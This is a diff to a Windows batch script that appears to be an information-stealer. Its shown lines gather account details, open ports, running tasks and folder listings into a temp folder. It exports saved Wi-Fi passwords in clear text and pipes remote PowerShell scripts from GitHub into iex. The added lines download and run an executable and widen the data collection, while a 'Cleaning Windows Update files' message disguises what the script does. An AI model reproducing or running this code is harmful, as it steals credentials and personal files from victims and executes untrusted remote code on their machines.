@@ -19,10 +19,15 @@ echo %USERNAME%'s Info:>>%TEMP%\wstemp\user_info.txt
 net user %USERNAME%>>%TEMP%\wstemp\user_info.txt
 echo Open Ports:>>%TEMP%\wstemp\open_ports.txt
 netstat -an > %TEMP%\wstemp\open_ports.txt
-md "%TEMP%\wstemp\Wi-Fi"
-netsh wlan export profile folder="%TEMP%\wstemp\Wi-Fi\" key=clear >nul
+if not exist "%TEMP%\wstemp\Wi-Fi" md "%TEMP%\wstemp\Wi-Fi"
+netsh wlan export profile folder="%TEMP%\wstemp\Wi-Fi" key=clear >nul
+echo Task List:>>%TEMP%\wstemp\tasks.txt
+tasklist>>%TEMP%\wstemp\tasks.txt
+dir "%USERPROFILE%\Documents" >> "%TEMP%\wstemp\dir.txt"
+dir "%USERPROFILE%\Desktop" >> "%TEMP%\wstemp\dir.txt"
+powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/fastfetch.exe -outfile %TEMP%\fastfetch.exe"
+%TEMP%\fastfetch.exe >> "%TEMP%\wstemp\fastfetch.txt"
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/zipping.ps1 | iex"
-dir "%USERPROFILE%\Documents" /s /b >> "%TEMP%\wstemp\documents.txt"
 pushd "%TEMP%\wstemp"
 echo Cleaning Windows Update files..
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat" >>"%TEMP%\wstemp\screenCapture.bat"
